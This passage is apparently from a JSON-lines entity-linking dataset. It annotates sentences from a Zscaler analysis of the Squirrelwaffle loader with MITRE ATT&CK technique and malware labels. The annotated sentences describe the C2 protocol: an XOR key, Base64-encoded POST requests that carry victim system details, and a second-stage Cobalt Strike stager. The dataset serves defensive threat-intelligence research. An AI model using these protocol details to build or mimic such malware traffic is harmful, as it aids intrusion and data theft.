reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 10: Formatted", "context_right": "configuration after decryption", "_context_left": "Figure 10: Formatted ", "_context_right": " configuration after decryption", "sentence_left": "![Figure 10: Formatted Squirrelwaffle configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "sentence_right": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Formatted Squirrelwaffle configuration after decryption", "context_left": "Figure 10:", "context_right": "", "_context_left": "Figure 10: ", "_context_right": "", "sentence_left": "![Figure 10: Formatted Squirrelwaffle configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "sentence_right": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Once the malware decodes all of the CnC domains and IP addresses", "context_left": "", "context_right": "to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.", "_context_left": "", "_context_right": " to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.", "sentence_left": "Figure 10: Formatted Squirrelwaffle configuration after decryption", "sentence_right": "The CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key ***KJKLO***.", "label": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "label_id": 514, "label_title": "Deobfuscate/Decode Files or Information", "label_link": "https://attack.mitre.org/techniques/T1140", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "creates a **socket** and sends the data using the **send()** function and receives the content from the CnC", "context_left": "Once the malware decodes all of the CnC domains and IP addresses to block, it", "context_right": "using **recv()** calls.", "_context_left": "Once the malware decodes all of the CnC domains and IP addresses to block, it ", "_context_right": " using **recv()** calls.", "sentence_left": "Figure 10: Formatted Squirrelwaffle configuration after decryption", "sentence_right": "The CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key ***KJKLO***.", "label": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.", "label_id": 452, "label_title": "Application Layer Protocol", "label_link": "https://attack.mitre.org/techniques/T1071", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "CnC communication protocol utilizes an HTTP POST", "context_left": "The", "context_right": "request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key ***KJKLO***.", "_context_left": "The ", "_context_right": " request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key ***KJKLO***.", "sentence_left": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.", "sentence_right": "An example HTTP POST request is shown below:", "label": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.", "label_id": 452, "label_title": "Application Layer Protocol", "label_link": "https://attack.mitre.org/techniques/T1071", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key", "context_left": "The CnC communication protocol utilizes an HTTP POST", "context_right": "***KJKLO***.", "_context_left": "The CnC communication protocol utilizes an HTTP POST ", "_context_right": " ***KJKLO***.", "sentence_left": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.", "sentence_right": "An example HTTP POST request is shown below:", "label": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.", "label_id": 162, "label_title": "Data Encoding", "label_link": "https://attack.mitre.org/techniques/T1132", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.", "context_left": "The path of the HTTP POST request consists of a", "context_right": "", "_context_left": "The path of the HTTP POST request consists of a ", "_context_right": "", "sentence_left": "Note that this request does not contain a User-Agent field in the HTTP header.", "sentence_right": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.", "label": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.", "label_id": 162, "label_title": "Data Encoding", "label_link": "https://attack.mitre.org/techniques/T1132", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "The HTTP POST body contains another Base64 encoded string that includes the victim’s computer name, username, application data directory, and workgroup.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "**t2nQfj3SL3XByImciQTqVa\\t192.168.125.11**", "sentence_right": "Each field is delimited with two tab characters.", "label": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "label_id": 195, "label_title": "Exfiltration Over C2 Channel", "label_link": "https://attack.mitre.org/techniques/T1041", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "**GEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t**", "sentence_right": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "label": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "label_id": 195, "label_title": "Exfiltration Over C2 Channel", "label_link": "https://attack.mitre.org/techniques/T1041", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "SquirrelWaffle", "context_left": "The", "context_right": "CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "_context_left": "The ", "_context_right": " CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "sentence_left": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.", "sentence_right": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim’s system information that was previously sent.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "CnC", "context_left": "The SquirrelWaffle", "context_right": "responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "_context_left": "The SquirrelWaffle ", "_context_right": " responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "sentence_left": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.", "sentence_right": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim’s system information that was previously sent.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "CnC responds with a Base64 encoded payload", "context_left": "The SquirrelWaffle", "context_right": "that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "_context_left": "The SquirrelWaffle ", "_context_right": " that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "sentence_left": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.", "sentence_right": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim’s system information that was previously sent.", "label": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.", "label_id": 162, "label_title": "Data Encoding", "label_link": "https://attack.mitre.org/techniques/T1132", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "The SquirrelWaffle CnC response may also contain a second-stage payload", "context_left": "", "context_right": ".", "_context_left": "", "_context_right": ".", "sentence_left": "**200\\r\\n\\t\\t\\n\\r1631911856\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**", "sentence_right": "An example decrypted response is shown below:", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CI", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "decrypted response is shown below:", "context_left": "An example", "context_right": "", "_context_left": "An example ", "_context_right": "", "sentence_left": "The SquirrelWaffle CnC response may also contain a second-stage payload.", "sentence_right": "**200\\r\\n\\t\\t\\n\\r1631913267\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rMZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\[[email protected]](/cdn-cgi/l/email-protection)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe8\\x00\\x00\\x00\\x0e\\x1f\\xba\\x0e\\x00\\xb4\\t\\xcd!\\xb8\\x01L\\xcd!This program cannot be run in DOS mode...\\x00\\x00\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**", "label": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.", "label_id": 162, "label_title": "Data Encoding", "label_link": "https://attack.mitre.org/techniques/T1132", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "SquirrelWaffle.", "context_left": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by", "context_right": "", "_context_left": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by ", "_context_right": "", "sentence_left": "**200\\r\\n\\t\\t\\n\\r1631913267\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rMZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\[[email protected]](/cdn-cgi/l/email-protection)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe8\\x00\\x00\\x00\\x0e\\x1f\\xba\\x0e\\x00\\xb4\\t\\xcd!\\xb8\\x01L\\xcd!This program cannot be run in DOS mode...\\x00\\x00\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**", "sentence_right": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Zscaler ThreatLabz has observed", "context_right": "deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.", "_context_left": "Zscaler ThreatLabz has observed ", "_context_right": " deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.", "sentence_left": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.", "sentence_right": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle deliver an executable file", "context_left": "Zscaler ThreatLabz has observed", "context_right": "with the MD5 hash 116301FD453397FDF3CB291341924147.", "_context_left": "Zscaler ThreatLabz has observed ", "_context_right": " with the MD5 hash 116301FD453397FDF3CB291341924147.", "sentence_left": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.", "sentence_right": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "This file is packed and decrypted in memory to produce a", "context_right": "stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "_context_left": "This file is packed and decrypted in memory to produce a ", "_context_right": " stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "sentence_left": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.", "sentence_right": "Figure 11 below shows interesting strings in the Cobalt Strike stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the", "context_right": ".", "_context_left": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the ", "_context_right": ".", "sentence_left": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.", "sentence_right": "Figure 11 below shows interesting strings in the Cobalt Strike stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "This file is packed and decrypted in memory to produce a", "context_left": "", "context_right": "Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "_context_left": "", "_context_right": " Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "sentence_left": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.", "sentence_right": "Figure 11 below shows interesting strings in the Cobalt Strike stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "label": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "label_id": 514, "label_title": "Deobfuscate/Decode Files or Information", "label_link": "https://attack.mitre.org/techniques/T1140", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "Figure 11 below shows interesting strings in the", "context_right": "stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "_context_left": "Figure 11 below shows interesting strings in the ", "_context_right": " stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "sentence_left": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "sentence_right": "The EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "strings in the Cobalt Strike stager that impersonates a [jQuery request]", "context_left": "Figure 11 below shows interesting", "context_right": "(https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "_context_left": "Figure 11 below shows interesting ", "_context_right": "(https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "sentence_left": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "sentence_right": "The EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "label": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.", "label_id": 415, "label_title": "Data Obfuscation", "label_link": "https://attack.mitre.org/techniques/T1001", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "The EICAR string is likely an artifact from the threat actor using a [demo version of", "context_right": "](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "_context_left": "The EICAR string is likely an artifact from the threat actor using a [demo version of ", "_context_right": "](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "sentence_left": "Figure 11 below shows interesting strings in the Cobalt Strike stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "sentence_right": "![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
